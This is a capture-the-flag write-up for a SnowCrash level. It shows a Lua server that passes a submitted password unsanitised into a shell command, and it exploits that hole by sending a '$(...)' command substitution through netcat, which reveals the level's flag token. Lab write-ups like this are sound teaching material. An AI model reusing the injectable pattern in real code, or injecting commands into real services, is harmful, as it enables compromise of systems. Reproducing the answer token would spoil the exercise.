# Solution

So once we logged in, we find in the home a file level11.lua here is the source code:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

so this look like server that is listening to port 5151 on localhost and wait for password once he received the password,
he passed to the hash function and do a comparaision with the hash that he received and another hash.

but if we take a close look at the hash function we will find something interesting.

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

This line !

```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

this line is pretty explainatory it use the password that you provide as an argument to execute some shell command,
and it will pipe to sha1sum, since we have control of pass we can input what we want and we can leverage simple metacharacter feature of bash,
such as \`\` or $(...) notation let's test if it's work !

```sh
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag > /tmp/test)
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

It's working ! now we can get the flag and go to next level
